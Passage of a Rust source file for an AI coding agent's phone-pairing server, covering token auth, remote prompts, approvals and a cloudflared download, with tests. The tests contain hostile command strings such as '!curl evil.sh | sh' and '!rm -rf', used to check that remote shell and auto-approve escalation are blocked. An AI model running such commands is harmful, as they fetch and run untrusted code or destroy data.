        if let Some(e) = info.get("tunnelError").and_then(Value::as_str) {
            lines.push(format!("  Note        : {e}"));
        }
        lines.push(format!("  Clients     : {} connected", info["connectedClients"]));
        lines.push(String::new());
        lines.push("  Scan QR code with your phone camera to control this session:".into());
        lines.push(qr);
        lines.push("╰─────────────────────────────────────────────────────────────────╯".into());
        lines.join("\n")
    }

    fn check_auth(&self, query: &[(String, String)], headers: &[(String, String)]) -> bool {
        let token = self.state.lock().unwrap().token.clone();
        let q = query.iter().find(|(k, _)| k == "token").or_else(|| query.iter().find(|(k, _)| k == "t")).map(|(_, v)| v.as_str());
        if safe_token_equals(q, &token) {
            return true;
        }
        headers.iter().find(|(k, _)| k == "authorization").and_then(|(_, v)| v.strip_prefix("Bearer ")).map(|b| safe_token_equals(Some(b.trim()), &token)).unwrap_or(false)
    }

    async fn handle_connection(&self, socket: tokio::net::TcpStream, stop: CancellationToken) -> Result<()> {
        let mut reader = BufReader::new(socket);
        let mut request_line = String::new();
        reader.read_line(&mut request_line).await?;
        let mut parts = request_line.split_whitespace();
        let method = parts.next().unwrap_or("").to_string();
        let target = parts.next().unwrap_or("/").to_string();
        let mut headers = vec![];
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).await? == 0 {
                break;
            }
            let line = line.trim_end();
            if line.is_empty() {
                break;
            }
            if let Some((k, v)) = line.split_once(':') {
                headers.push((k.trim().to_ascii_lowercase(), v.trim().to_string()));
            }
        }
        let parsed = url::Url::parse(&format!("http://127.0.0.1{target}")).unwrap_or_else(|_| url::Url::parse("http://127.0.0.1/").unwrap());
        let path = parsed.path().to_string();
        let query: Vec<(String, String)> = parsed.query_pairs().map(|(k, v)| (k.to_string(), v.to_string())).collect();
        let length: usize = headers.iter().find(|(k, _)| k == "content-length").and_then(|(_, v)| v.parse().ok()).unwrap_or(0);
        // The body must be read through the buffered reader: it may already hold those bytes.
        let body: std::result::Result<Value, String> = if method == "POST" {
            if length > 256 * 1024 {
                Err("Payload too large".into())
            } else {
                let mut buf = vec![0u8; length];
                match reader.read_exact(&mut buf).await {
                    Ok(_) => {
                        let raw = String::from_utf8_lossy(&buf).trim().to_string();
                        if raw.is_empty() {
                            Ok(json!({}))
                        } else {
                            crate::jsutil::parse_json(&raw)
                        }
                    }
                    Err(e) => Err(e.to_string()),
                }
            }
        } else {
            Ok(json!({}))
        };
        let mut socket = reader.into_inner();
        let respond =
            |status: &str, ctype: &str, body: String, extra: &str| format!("HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nConnection: close\r\n{extra}\r\n{body}", body.len());
        if method == "GET" && path == "/favicon.ico" {
            socket.write_all(b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").await?;
            return Ok(());
        }
        if !self.check_auth(&query, &headers) {
            socket.write_all(respond("401 Unauthorized", "application/json; charset=utf-8", json!({ "error": "Unauthorized: invalid or missing pairing token." }).to_string(), "").as_bytes()).await?;
            return Ok(());
        }
        let read_body = |socket: tokio::net::TcpStream| async move {
            match body {
                Ok(v) => Ok((socket, v)),
                Err(e) => Err((socket, anyhow!(e))),
            }
        };
        match (method.as_str(), path.as_str()) {
            ("GET", "/") => {
                socket.write_all(respond("200 OK", "text/html; charset=utf-8", MOBILE_HTML.to_string(), "Cache-Control: no-store, no-cache, must-revalidate\r\n").as_bytes()).await?;
            }
            ("GET", "/api/state") => {
                self.ensure_history_seeded();
                let since = query.iter().find(|(k, _)| k == "since").and_then(|(_, v)| v.parse::<f64>().ok()).filter(|v| v.is_finite() && *v > 0.0).unwrap_or(0.0);
                let (entries, pending) = {
                    let st = self.state.lock().unwrap();
                    let entries: Vec<Value> = st.entries.iter().filter(|e| since <= 0.0 || e.seq as f64 > since).map(Entry::to_value).collect();
                    let pending: Vec<Value> = st.pending.iter().map(|(id, p)| json!({ "id": id, "tool": p.tool, "preview": p.preview, "createdAt": p.created_at })).collect();
                    (entries, pending)
                };
                let body = json!({ "state": (self.callbacks.get_state)(), "entries": entries, "pendingApprovals": pending });
                socket.write_all(respond("200 OK", "application/json; charset=utf-8", stringify(&body), "Cache-Control: no-store\r\n").as_bytes()).await?;
            }
            ("GET", "/api/events") => {
                self.ensure_history_seeded();
                socket.write_all(b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream; charset=utf-8\r\nCache-Control: no-cache, no-store, no-transform\r\nConnection: keep-alive\r\nX-Accel-Buffering: no\r\n\r\n").await?;
                // 2 KB comment padding first so proxies flush the stream immediately.
                let mut first = format!(": {}\n\n", " ".repeat(2048));
                first.push_str(&format!("data: {}\n\n", stringify(&json!({ "type": "state", "state": (self.callbacks.get_state)() }))));
                let (tx, mut rx) = mpsc::unbounded_channel::<String>();
                {
                    let mut st = self.state.lock().unwrap();
                    for e in &st.entries {
                        first.push_str(&format!("data: {}\n\n", stringify(&json!({ "type": "entry", "entry": e.to_value() }))));
                    }
                    for (id, p) in &st.pending {
                        first.push_str(&format!("data: {}\n\n", stringify(&json!({ "type": "approval", "id": id, "tool": p.tool, "preview": p.preview }))));
                    }
                    let id = self.client_ids.fetch_add(1, Ordering::SeqCst);
                    st.clients.push((id, tx));
                }
                socket.write_all(first.as_bytes()).await?;
                loop {
                    tokio::select! {
                        _ = stop.cancelled() => return Ok(()),
                        msg = rx.recv() => {
                            let Some(msg) = msg else { return Ok(()) };
                            if socket.write_all(msg.as_bytes()).await.is_err() {
                                return Ok(());
                            }
                        }
                    }
                }
            }
            ("POST", "/api/prompt") => match read_body(socket).await {
                Err((mut s, e)) => s.write_all(respond("500 Internal Server Error", "application/json", json!({ "error": e.to_string() }).to_string(), "").as_bytes()).await?,
                Ok((mut s, body)) => {
                    let prompt = body.get("prompt").and_then(Value::as_str).unwrap_or("").trim().to_string();
                    if prompt.is_empty() {
                        s.write_all(respond("400 Bad Request", "application/json", json!({ "error": "Prompt is required" }).to_string(), "").as_bytes()).await?;
                    } else if is_forbidden_remote_input(&prompt) {
                        s.write_all(
                            respond(
                                "403 Forbidden",
                                "application/json",
                                json!({ "error": "Direct shell execution (!cmd) and auto-approve mode escalation are disabled for remote devices." }).to_string(),
                                "",
                            )
                            .as_bytes(),
                        )
                        .await?;
                    } else {
                        self.notify_user_prompt(&prompt);
                        (self.callbacks.on_remote_prompt)(prompt);
                        s.write_all(respond("200 OK", "application/json", json!({ "ok": true }).to_string(), "").as_bytes()).await?;
                    }
                }
            },
            ("POST", "/api/mode") => match read_body(socket).await {
                Err((mut s, e)) => s.write_all(respond("500 Internal Server Error", "application/json", json!({ "error": e.to_string() }).to_string(), "").as_bytes()).await?,
                Ok((mut s, body)) => {
                    let mode = body.get("mode").and_then(Value::as_str).unwrap_or("").to_string();
                    if mode == "auto" {
                        s.write_all(respond("403 Forbidden", "application/json", json!({ "error": "Cannot enable auto-approve mode from a remote paired device." }).to_string(), "").as_bytes())
                            .await?;
                    } else if ["ask", "plan", "readonly"].contains(&mode.as_str()) {
                        (self.callbacks.on_remote_mode_change)(mode.clone());
                        self.sync_state();
                        s.write_all(respond("200 OK", "application/json", json!({ "ok": true, "mode": mode }).to_string(), "").as_bytes()).await?;
                    } else {
                        s.write_all(respond("400 Bad Request", "application/json", json!({ "error": "Invalid mode" }).to_string(), "").as_bytes()).await?;
                    }
                }
            },
            ("POST", "/api/stop") => {
                (self.callbacks.on_remote_stop)();
                self.sync_state();
                socket.write_all(respond("200 OK", "application/json", json!({ "ok": true }).to_string(), "").as_bytes()).await?;
            }
            ("POST", "/api/approve") => match read_body(socket).await {
                Err((mut s, e)) => s.write_all(respond("500 Internal Server Error", "application/json", json!({ "error": e.to_string() }).to_string(), "").as_bytes()).await?,
                Ok((mut s, body)) => {
                    let id = body.get("id").and_then(Value::as_str).unwrap_or("").to_string();
                    let decision = body.get("decision").and_then(Value::as_str).unwrap_or("").to_string();
                    let pending = if ["yes", "no", "always"].contains(&decision.as_str()) { self.state.lock().unwrap().pending.shift_remove(&id) } else { None };
                    match pending {
                        Some(mut p) => {
                            if let Some(tx) = p.tx.take() {
                                let _ = tx.send(decision.clone());
                            }
                            self.broadcast(&json!({ "type": "approval_resolved", "id": id, "decision": decision }), false);
                            s.write_all(respond("200 OK", "application/json", json!({ "ok": true, "decision": decision }).to_string(), "").as_bytes()).await?;
                        }
                        None => s.write_all(respond("404 Not Found", "application/json", json!({ "error": "Approval request not found or already resolved" }).to_string(), "").as_bytes()).await?,
                    }
                }
            },
            _ => socket.write_all(respond("404 Not Found", "application/json", json!({ "error": "Not found" }).to_string(), "").as_bytes()).await?,
        }
        Ok(())
    }
}

async fn can_spawn(bin: &str) -> bool {
    let mut cmd = tokio::process::Command::new(bin);
    cmd.arg("--version").stdin(std::process::Stdio::null()).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::null()).kill_on_drop(true);
    match cmd.spawn() {
        Ok(mut c) => matches!(tokio::time::timeout(Duration::from_secs(10), c.wait()).await, Ok(Ok(s)) if s.success()),
        Err(_) => false,
    }
}

async fn resolve_cloudflared_binary() -> String {
    if can_spawn("cloudflared").await {
        return "cloudflared".into();
    }
    let dir = crate::config::config_dir().join("bin");
    let name = if cfg!(windows) { "cloudflared.exe" } else { "cloudflared" };
    let local = dir.join(name);
    let local_text = local.to_string_lossy().to_string();
    if std::fs::metadata(&local).map(|m| m.is_file() && m.len() > 1024).unwrap_or(false) && can_spawn(&local_text).await {
        return local_text;
    }
    let asset = match (std::env::consts::OS, std::env::consts::ARCH) {
        ("windows", "aarch64") => "cloudflared-windows-arm64.exe",
        ("windows", _) => "cloudflared-windows-amd64.exe",
        ("linux", "aarch64") => "cloudflared-linux-arm64",
        ("linux", _) => "cloudflared-linux-amd64",
        _ => return "cloudflared".into(),
    };
    let download = async {
        std::fs::create_dir_all(&dir).ok()?;
        let client = reqwest::Client::builder().timeout(Duration::from_secs(30)).build().ok()?;
        let res = client.get(format!("https://github.com/cloudflare/cloudflared/releases/latest/download/{asset}")).send().await.ok()?;
        if !res.status().is_success() {
            return None;
        }
        let bytes = res.bytes().await.ok()?;
        std::fs::write(&local, &bytes).ok()?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&local, std::fs::Permissions::from_mode(0o755));
        }
        Some(())
    };
    if download.await.is_some() && can_spawn(&local_text).await {
        return local_text;
    }
    "cloudflared".into()
}

const MOBILE_HTML: &str = include_str!("pair_mobile.html");

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn qr_and_forbidden_inputs() {
        let m = encode_qr_matrix("https://example.trycloudflare.com/?t=abcdefghijklmnopqrstuv").unwrap();
        assert_eq!(m.len(), 17 + 4 * 4);
        assert!(m[0][0] && m[0][6] && !m[1][1]);
        assert!(render_qr_terminal("hi", "  ").lines().all(|l| l.starts_with("  ")));
        assert!(encode_qr_matrix(&"x".repeat(400)).is_err());
        let url = "https://goon-test-tunnel.trycloudflare.com/?t=abc123xyz789";
        let m = encode_qr_matrix(url).unwrap();
        assert!((21..=57).contains(&m.len()) && m.iter().all(|row| row.len() == m.len()));
        assert!(m[0][0] && m[0][6] && m[6][0] && m[6][6] && m[3][3]);
        let rendered = render_qr_terminal(url, "  ");
        assert!(rendered.split('\n').count() >= 12 && rendered.split('\n').all(|l| l.starts_with("  ")));
        assert!(rendered.contains(['▀', '▄', '█']));
        assert!(is_forbidden_remote_input("!rm -rf"));
        assert!(is_forbidden_remote_input("/auto on"));
        assert!(is_forbidden_remote_input("/mode"));
        assert!(!is_forbidden_remote_input("/auto off"));
        assert!(!is_forbidden_remote_input("/mode plan"));
        assert!(safe_token_equals(Some("abc"), "abc"));
        assert!(!safe_token_equals(Some("abd"), "abc"));
    }

    #[tokio::test]
    async fn serves_state_with_token_and_resolves_remote_approvals() {
        let prompts = Arc::new(Mutex::new(vec![]));
        let p2 = prompts.clone();
        let pm = PairManager::new(PairCallbacks {
            get_state: Arc::new(|| json!({ "sessionId": "s1", "mode": "ask" })),
            get_history: Arc::new(|| vec![("user".into(), "hello".into())]),
            on_remote_prompt: Arc::new(move |p| p2.lock().unwrap().push(p)),
            on_remote_mode_change: Arc::new(|_| {}),
            on_remote_stop: Arc::new(|| {}),
            on_notice: Arc::new(|_| {}),
        });
        pm.start(true).await.unwrap();
        let info = pm.info();
        let port = info["port"].as_u64().unwrap();
        let token = info["token"].as_str().unwrap().to_string();
        let client = reqwest::Client::new();
        let unauthorized = client.get(format!("http://127.0.0.1:{port}/api/state")).send().await.unwrap();
        assert_eq!(unauthorized.status().as_u16(), 401);
        let state: Value = client.get(format!("http://127.0.0.1:{port}/api/state?t={token}")).send().await.unwrap().json().await.unwrap();
        assert_eq!(state["entries"][0]["text"], "› hello");
        let forbidden = client.post(format!("http://127.0.0.1:{port}/api/prompt")).bearer_auth(&token).json(&json!({ "prompt": "!ls" })).send().await.unwrap();
        assert_eq!(forbidden.status().as_u16(), 403);
        let ok = client.post(format!("http://127.0.0.1:{port}/api/prompt")).bearer_auth(&token).json(&json!({ "prompt": "do it" })).send().await.unwrap();
        assert_eq!(ok.status().as_u16(), 200);
        assert_eq!(*prompts.lock().unwrap(), vec!["do it".to_string()]);
        let approval = pm.request_remote_approval("bash", "$ ls", CancellationToken::new());
        let res = client.post(format!("http://127.0.0.1:{port}/api/approve?t={token}")).json(&json!({ "id": approval.id, "decision": "always" })).send().await.unwrap();
        assert_eq!(res.status().as_u16(), 200);
        assert_eq!(approval.wait().await.as_deref(), Some("always"));
        assert!(pm.format_banner().contains("LAN Mode (0.0.0.0)"));
        pm.stop().await;
        assert!(!pm.is_running());
    }

    #[tokio::test]
    async fn token_auth_on_every_route_blocks_escalation_and_supports_delta_polling() {
        let prompts = Arc::new(Mutex::new(Vec::<String>::new()));
        let modes = Arc::new(Mutex::new(Vec::<String>::new()));
        let stops = Arc::new(AtomicU64::new(0));
        let (p2, m2, s2) = (prompts.clone(), modes.clone(), stops.clone());
        let pm = PairManager::new(PairCallbacks {
            get_state: Arc::new(
                || json!({ "model": "test-model", "provider": "openai-compatible", "cwd": "/workspace/demo", "sessionId": "12345678-abcd", "mode": "ask", "status": "Ready", "tokens": 420, "contextWindow": 128000 }),
            ),
            get_history: Arc::new(Vec::new),
            on_remote_prompt: Arc::new(move |p| p2.lock().unwrap().push(p)),
            on_remote_mode_change: Arc::new(move |m| m2.lock().unwrap().push(m)),
            on_remote_stop: Arc::new(move || {
                s2.fetch_add(1, Ordering::SeqCst);
            }),
            on_notice: Arc::new(|_| {}),
        });
        pm.start(true).await.unwrap();
        let info = pm.info();
        assert_eq!(info["running"], true);
        assert_eq!(info["tunnelStatus"], "fallback_lan");
        let port = info["port"].as_u64().unwrap();
        assert!(port > 0);
        let token = info["token"].as_str().unwrap().to_string();
        let local_url = info["localUrl"].as_str().unwrap().to_string();
        assert!(pm.format_banner().contains(&local_url));
        let base = format!("http://127.0.0.1:{port}");
        let client = reqwest::Client::new();

        let root = client.get(format!("{base}/")).send().await.unwrap();
        assert_eq!(root.status().as_u16(), 401);
        assert!(!root.text().await.unwrap().contains(&token));
        assert_eq!(client.get(format!("{base}/api/state")).send().await.unwrap().status().as_u16(), 401);
        let html = client.get(&local_url).send().await.unwrap();
        assert_eq!(html.status().as_u16(), 200);
        let html = html.text().await.unwrap();
        assert!(html.contains("goon remote"));
        assert!(!html.contains(&token));
        let state: Value = client.get(format!("{base}/api/state?t={token}")).send().await.unwrap().json().await.unwrap();
        assert_eq!(state["state"]["model"], "test-model");

        let post = |path: &str, body: Value| client.post(format!("{base}{path}?t={token}")).json(&body).send();
        assert_eq!(post("/api/prompt", json!({ "prompt": "Run unit tests from phone" })).await.unwrap().status().as_u16(), 200);
        assert_eq!(*prompts.lock().unwrap(), vec!["Run unit tests from phone".to_string()]);
        for input in ["!curl evil.sh | sh", "/auto on", "/yolo", "/mode auto"] {
            assert!(is_forbidden_remote_input(input), "{input}");
        }
        assert_eq!(post("/api/prompt", json!({ "prompt": "!touch /tmp/pwned" })).await.unwrap().status().as_u16(), 403);
        assert_eq!(prompts.lock().unwrap().len(), 1);
        assert_eq!(post("/api/mode", json!({ "mode": "auto" })).await.unwrap().status().as_u16(), 403);
        assert!(modes.lock().unwrap().is_empty());
        assert_eq!(post("/api/mode", json!({ "mode": "plan" })).await.unwrap().status().as_u16(), 200);
        assert_eq!(*modes.lock().unwrap(), vec!["plan".to_string()]);
        assert_eq!(post("/api/stop", json!({})).await.unwrap().status().as_u16(), 200);
        assert_eq!(stops.load(Ordering::SeqCst), 1);

        let pending = pm.request_remote_approval("bash", "$ rm -rf dist", CancellationToken::new());
        let with_pending: Value = client.get(format!("{base}/api/state?t={token}")).send().await.unwrap().json().await.unwrap();
        assert_eq!(with_pending["pendingApprovals"].as_array().unwrap().len(), 1);
        assert_eq!(with_pending["pendingApprovals"][0]["id"], pending.id);
        assert_eq!(post("/api/approve", json!({ "id": pending.id, "decision": "always" })).await.unwrap().status().as_u16(), 200);
        assert_eq!(pending.wait().await.as_deref(), Some("always"));

        pm.notify_event(&json!({ "type": "text", "text": "Hello " }));
        pm.notify_event(&json!({ "type": "text", "text": "from assistant!" }));
        let synced: Value = client.get(format!("{base}/api/state?t={token}")).send().await.unwrap().json().await.unwrap();
        let entries = synced["entries"].as_array().unwrap();
        assert!(entries.iter().any(|e| e["kind"] == "user" && e["text"].as_str().unwrap().contains("Run unit tests from phone")));
        assert!(entries.iter().any(|e| e["kind"] == "assistant" && e["text"] == "Hello from assistant!"));
        let max_seq = entries.iter().map(|e| e["seq"].as_u64().unwrap()).max().unwrap();
        let delta: Value = client.get(format!("{base}/api/state?t={token}&since={max_seq}")).send().await.unwrap().json().await.unwrap();
        assert_eq!(delta["entries"].as_array().unwrap().len(), 0);

        pm.notify_event(&json!({ "type": "verify_start", "files": ["src/a.ts"], "commands": ["npm test"] }));
        pm.notify_event(&json!({ "type": "verify_result", "status": "fail", "stage": "test", "reason": "1 failing test", "errors": [], "warnings": [], "durationMs": 4 }));
        pm.notify_event(&json!({ "type": "verify_rollback", "reason": "Verification failed", "restored": ["src/a.ts"], "deleted": [], "conflicts": [] }));
        let verify: Value = client.get(format!("{base}/api/state?t={token}")).send().await.unwrap().json().await.unwrap();
        let rows: Vec<String> =
            verify["entries"].as_array().unwrap().iter().filter(|e| e["kind"] == "tool" && e["text"].as_str().unwrap().contains("[verify")).map(|e| e["text"].as_str().unwrap().to_string()).collect();
        assert!(rows.iter().any(|t| t.contains("[verify] 1 file(s)")), "{rows:?}");
        assert!(rows.iter().any(|t| t.contains("[verify] fail: 1 failing test")), "{rows:?}");
        assert!(rows.iter().any(|t| t.contains("[verify rollback]")), "{rows:?}");
        pm.stop().await;
    }
}
